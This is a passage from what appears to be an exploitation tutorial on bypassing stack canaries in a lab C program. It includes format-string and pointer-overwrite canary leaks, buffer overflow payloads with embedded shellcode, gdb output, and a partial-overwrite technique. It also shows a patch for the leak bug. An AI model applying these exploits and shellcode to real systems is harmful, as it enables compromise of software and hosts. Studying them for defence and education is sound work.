</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x03</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x69\x64\x00\x56\x57\x54\x5e\x6a\x3b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_canary</span>(p: Popen):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%49$p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    canary_pos <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> n <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1024</span>:
</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>readline()
</span></span><span style="display:flex;"><span>        canary_pos <span style="color:#f92672">=</span> out<span style="color:#f92672">.</span>find( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x&#34;</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> bool( <span style="color:#f92672">~</span>canary_pos ):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> int( out[canary_pos : canary_pos<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>], <span style="color:#ae81ff">16</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> canary
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hijack_exec</span>(p: Popen, canary):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x112</span>                               <span style="color:#75715e"># Fills the stack frame</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, canary )                <span style="color:#75715e"># Places the correct canary value </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                                 <span style="color:#75715e"># Base pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7fffffffdd60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span> ) <span style="color:#75715e"># Instruction pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>                             <span style="color:#75715e"># NOPs for padding</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> buf                                        <span style="color:#75715e"># Shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit_target</span>(p: Popen):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We use &#39;stdbuf -o0&#39; to force the targeted program pipes to be flushed</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># So we can read leaked canary/cookie immediately</span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> Popen( [<span style="color:#e6db74">&#34;stdbuf&#34;</span>, <span style="color:#e6db74">&#34;-o0&#34;</span>, TARGET_PATH], stdin<span style="color:#f92672">=</span>PIPE, stdout<span style="color:#f92672">=</span>PIPE )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Make stdout non-blocking when using read/readline</span>
</span></span><span style="display:flex;"><span>    flags <span style="color:#f92672">=</span> fcntl<span style="color:#f92672">.</span>fcntl( p<span style="color:#f92672">.</span>stdout, fcntl<span style="color:#f92672">.</span>F_GETFL )
</span></span><span style="display:flex;"><span>    fcntl<span style="color:#f92672">.</span>fcntl( p<span style="color:#f92672">.</span>stdout, fcntl<span style="color:#f92672">.</span>F_SETFL, flags <span style="color:#f92672">|</span> os<span style="color:#f92672">.</span>O_NONBLOCK )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> leak_canary( p )
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> bool( <span style="color:#f92672">~</span>canary ):
</span></span><span style="display:flex;"><span>        print( <span style="color:#e6db74">&#34;Canary : 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> canary )
</span></span><span style="display:flex;"><span>        hijack_exec( p, canary )
</span></span><span style="display:flex;"><span>        exit_target( p )
</span></span><span style="display:flex;"><span>        out, _ <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>communicate()
</span></span><span style="display:flex;"><span>        print( out<span style="color:#f92672">.</span>decode() )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        exit_target( p )
</span></span><span style="display:flex;"><span>        print( <span style="color:#e6db74">&#34;[-] Failed to leak the canary&#34;</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Therefore, the reading functions must be modified as follows to prevent such a leak from occurring:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">bool</span> g_bCanRead <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_write</span>(Buffer <span style="color:#f92672">*</span>pBuf, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpData, <span style="color:#66d9ef">size_t</span> n) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( pBuf<span style="color:#f92672">-&gt;</span>nSize ) 
</span></span><span style="display:flex;"><span>        pBuf<span style="color:#f92672">-&gt;</span>data[ pBuf<span style="color:#f92672">-&gt;</span>nSize<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>( pBuf<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">+</span> pBuf<span style="color:#f92672">-&gt;</span>nSize, cpData, n );
</span></span><span style="display:flex;"><span>    pBuf<span style="color:#f92672">-&gt;</span>nSize <span style="color:#f92672">+=</span> n;
</span></span><span style="display:flex;"><span>    g_bCanRead <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_read</span>(Buffer <span style="color:#f92672">*</span>pBuf) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>pBuf<span style="color:#f92672">-&gt;</span>cpReadData )
</span></span><span style="display:flex;"><span>        pBuf<span style="color:#f92672">-&gt;</span>cpReadData <span style="color:#f92672">=</span> pBuf<span style="color:#f92672">-&gt;</span>data;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>g_bCanRead ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fputs</span>( <span style="color:#e6db74">&#34;[-] Cannot Read&#34;</span>, stderr );
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;%s&#34;</span>, pBuf<span style="color:#f92672">-&gt;</span>cpReadData );
</span></span><span style="display:flex;"><span>    pBuf<span style="color:#f92672">-&gt;</span>cpReadData <span style="color:#f92672">+=</span> pBuf<span style="color:#f92672">-&gt;</span>nSize;
</span></span><span style="display:flex;"><span>    g_bCanRead <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_readall</span>(Buffer <span style="color:#f92672">*</span>pBuf) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;%s&#34;</span>, pBuf<span style="color:#f92672">-&gt;</span>data );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This modification fixes the memory disclosure vulnerabilities in the program by using the <code>printf</code> function in a safe way instead of passing the user input directly as a format and also placing restrictions on the <code>buf_read</code> function to prevent over-reading the buffer.</p>
<pre tabindex="0"><code>┌──(user㉿host)-[~]
└─$ python3 exploit.py                              
[-] Failed to leak the canary   
</code></pre><p>The exploit we developed is no longer effective. Fixing memory disclosure bugs had broken it, as it relied primarily on exploiting one of them in the exploitation chain.</p>
<h3 id="dont-worry-we-still-can-leak-it-without-additional-bugs">Don&rsquo;t Worry We Still Can Leak It Without Additional Bugs</h3>
<p>Having a vulnerability that allows data to be leaked from memory can be very helpful, but this doesn&rsquo;t always happen. In such cases, the alternative solution is to use the same buffer overflow vulnerability you have in an attempt to leak secret and sensitive data from memory. Let&rsquo;s review the stack layout. It looks like this:</p>
<pre tabindex="0"><code>0x00 -&gt; *--------------------------* &lt;-- Injection Point
        |                          |
        |                          |
        |                          |
        |                          |
        |                          |
        |                          |
0x100-&gt; *--------------------------* &lt;-- Buffer-&gt;cpReadData
        |                          |
0x108-&gt; *--------------------------* &lt;-- Buffer-&gt;nSize
        |                          |
0x110-&gt; *--------------------------* &lt;-- Junk data
        |                          |      
0x118-&gt; *--------------------------* &lt;-- Canary / Cookie
        |                          |      
0x120-&gt; *--------------------------* &lt;-- Saved RBP ( Base Pointer )
        |                          |      
0x128-&gt; *--------------------------* &lt;-- Saved RIP ( Instruction Pointer )
        |                          |      
        *--------------------------*
</code></pre><p>Don&rsquo;t you notice something? The <code>Buffer-&gt;cpReadData</code> pointer used to read memory is under our control. We can forge that address and make it point to any other location we want in memory and leak its content. Our plan will go as follows:</p>
<ol>
<li>Filling the buffer until getting into the targeted pointer using the write function.</li>
<li>Overwriting the <code>Buffer-&gt;cpReadData</code> with the canary address.</li>
<li>Leaking out the canary by triggering the read function.</li>
<li>Triggering the write function again to overwrite the remaining data with a crafted payload.</li>
<li>Triggering shellcode execution by leveraging the exit function that allows the main to return.</li>
</ol>
<pre tabindex="0"><code>(gdb) c
Continuing.

Breakpoint 1, 0x00005555555553cf in main ()
(gdb) x/a $rbp-8
0x7fffffffdd48: 0xe1125f7dcee84f00
</code></pre><p>I attached gdb to the target process and put a breakpoint at the main function. After examining the canary, I found that it lives at <code>0x7fffffffdd48</code> in memory. However, there is a problem here: the canary always contains a null byte at its lowest order (Least Significant Byte). Therefore, we have to read from that address plus one so the null byte doesn&rsquo;t stop us, and we can obtain seven bytes from leaked data and append the null ourselves.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_canary</span>(p: Popen):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>                         <span style="color:#75715e"># Filling the stack frame</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7fffffffdd49</span> )  <span style="color:#75715e"># Buffer-&gt;cpReadData</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>)                      <span style="color:#75715e"># Buffer-&gt;nSize ( To avoid touching it )</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    canary_pos <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> n <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1024</span>:
</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>readline()
</span></span><span style="display:flex;"><span>        canary_pos <span style="color:#f92672">=</span> out<span style="color:#f92672">.</span>find( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Choose: &#34;</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> bool( <span style="color:#f92672">~</span>canary_pos ) <span style="color:#f92672">and</span> canary_pos<span style="color:#f92672">+</span><span style="color:#ae81ff">15</span> <span style="color:#f92672">&lt;</span> len(out):
</span></span><span style="display:flex;"><span>            canary_pos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> out[canary_pos : canary_pos<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>] )[ <span style="color:#ae81ff">0</span> ]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> canary
</span></span></code></pre></div><p>This function does what we discussed earlier: it leaks the canary data, attempts to parse it into an integer value, and then returns it to the caller. Things are going well, so we just need to make a few changes to the <code>hijack_exec</code> function, and everything will be in order.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hijack_exec</span>(p: Popen, canary):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x7</span>                                 <span style="color:#75715e"># Fills the stack frame</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, canary )                <span style="color:#75715e"># Places the correct canary value </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                                 <span style="color:#75715e"># Base pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7fffffffdd60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span> ) <span style="color:#75715e"># Instruction pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>                             <span style="color:#75715e"># NOPs for padding</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> buf                                        <span style="color:#75715e"># Shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span></code></pre></div><p>We changed almost nothing except the first line, as the <code>leak_canary</code> function will fill most of the stack frame, leaving only a little space on the stack that we need to overflow to get into vital stuff.</p>
<center><img src="/imgs/mitigations_canary_leak_2.png"/></center>
<p><strong>Bingo, our plan worked.</strong></p>
<h3 id="jumping-over-the-sh1t">Jumping Over The Sh1t</h3>
<p>Not all programs are designed to operate interactively. Many take input from the user and perform their tasks directly in one fell swoop. In this case, we cannot leak the canary, whether using a vulnerability or other techniques and then complete the attack by using the overflowing vulnerability to hijack the program&rsquo;s execution. In such cases, we need a creative way to defeat this protection with one shot. This isn&rsquo;t easy and depends mainly on the logic of the targeted program and how it works. Let us take an example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">64</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nSize;
</span></span><span style="display:flex;"><span>} Buffer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Buffer <span style="color:#a6e22e">buf_new</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (Buffer) { <span style="color:#ae81ff">0x00</span> };
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_write</span>(Buffer <span style="color:#f92672">*</span>pBuf, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpData, <span style="color:#66d9ef">size_t</span> n) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( n<span style="color:#f92672">--</span> )
</span></span><span style="display:flex;"><span>        pBuf<span style="color:#f92672">-&gt;</span>data[ pBuf<span style="color:#f92672">-&gt;</span>nSize<span style="color:#f92672">++</span> ] <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>cpData<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_read</span>(Buffer <span style="color:#f92672">*</span>pBuf) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;%s&#34;</span>, pBuf<span style="color:#f92672">-&gt;</span>data );
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    Buffer buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_new</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpLine <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;Data: &#34;</span> );
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#a6e22e">getdelim</span>( (<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>cpLine, <span style="color:#f92672">&amp;</span>n, <span style="color:#ae81ff">0x0a</span>, stdin );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">~</span>n ) <span style="color:#75715e">// Sanity check to avoid calling `buf_write` if `getdelim` failed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">buf_write</span>( <span style="color:#f92672">&amp;</span>buf, cpLine, n );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;Your Data :&#34;</span> );
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">buf_read</span>( <span style="color:#f92672">&amp;</span>buf );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This example is similar to the previous one. There&rsquo;s nothing new in it except that it doesn&rsquo;t work interactively. It reads from the user and prints the user&rsquo;s input to the screen.</p>
<pre tabindex="0"><code>┌──(user㉿host)-[~]
└─$ gcc -fstack-protector -zexecstack test.c -o test
                                                                                                                                                         
┌──(user㉿host)-[~]
└─$ ./test                                          
Data: Hello Guys, I&#39;m 0xNinjaCyclone.
Your Data :
Hello Guys, I&#39;m 0xNinjaCyclone.
</code></pre><p>Focus well on this line:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        pBuf<span style="color:#f92672">-&gt;</span>data[ pBuf<span style="color:#f92672">-&gt;</span>nSize<span style="color:#f92672">++</span> ] <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>cpData<span style="color:#f92672">++</span>;
</span></span></code></pre></div><p>It looks like a normal code that copies data from one memory to another byte by byte. But it&rsquo;s not, my friend. We can abuse it in a very sinister way to jump over the canary without damaging it. Let me explain it to you more so you understand what I mean. It performs a buffer dereference based on the <code>pBuf-&gt;nSize</code> value, copies to that location one byte from memory pointed to by the <code>cpData</code> pointer, and increments those values ​​by one so that it can move the next byte in the next iteration, and continues doing that in a loop until all the data has been moved.</p>
<p>This variable, which tells the program where to write data, is under our control. However, we can&rsquo;t effectively change it completely. We can only change the byte in the lowest order because changing that byte completely changes the location we&rsquo;re writing to. This is enough to defeat the protection. We can make the write jump to write directly to the instruction pointer without having to write sequentially and destroy the canary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span> )                          <span style="color:#75715e"># Fills the Buffer </span>
